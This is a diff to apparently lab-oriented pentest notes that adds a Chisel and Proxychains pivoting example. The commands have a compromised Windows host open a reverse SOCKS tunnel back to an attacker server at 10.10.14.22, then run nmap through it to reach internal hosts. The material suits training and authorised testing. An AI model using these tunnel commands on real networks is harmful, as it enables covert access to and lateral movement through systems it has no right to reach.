@@ -151,12 +151,46 @@ root@kali:/opt/chisel# ./chisel --help
 
 ![](https://0xdf.gitlab.io/img/chisel-2.webp)
 
+
+
+### Example to tunnel out traffic \(Chisel + Proxychains\):
+
+Attacker:
+
+```text
+./chisel server -p 8080 --reverse
+```
+
+Client:
+
+```text
+chisel-x64.exe client 10.10.14.22:8080 R:socks
+```
+
+Next, add the following line to `/etc/proxychains` :
+
+```text
+socks5 127.0.0.1 1080
+```
+
+From there on out, it is possible to connect to services using proxychains i.e.:
+
+```text
+proxychains nmap 10.10.10.198 -sT -p8888
+```
+
+{% hint style="warning" %}
+Some tools don't work well with proxychains. Nmap's TCP SYN scan doesn't work, so instead of providing the -sS parameter the -sT parameter \(TCP connect\) has to be provided. For more information, read [https://security.stackexchange.com/questions/122561/how-to-use-nmap-through-proxychains](https://security.stackexchange.com/questions/122561/how-to-use-nmap-through-proxychains). Also, see HTB Buff notes.
+{% endhint %}
+
 Read more:
 
-* [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) \(Blog by Oxdf\)
-* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
-* [https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) \(HTB Reddish by ippsec\)
-* [https://0xdf.gitlab.io/2019/01/26/htb-reddish.html](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) \(HTB Reddish by 0xdf\)
+* ​[https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) \(Blog by Oxdf\)
+* ​[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)​
+* ​[https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) \(HTB Reddish by ippsec\)
+* ​[https://0xdf.gitlab.io/2019/01/26/htb-reddish.html](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) \(HTB Reddish by 0xdf\)
+* [https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29](https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29) \(HTB BUFF\)
+* [https://security.stackexchange.com/questions/122561/how-to-use-nmap-through-proxychains](https://security.stackexchange.com/questions/122561/how-to-use-nmap-through-proxychains)
 
 ## Rpivot
 
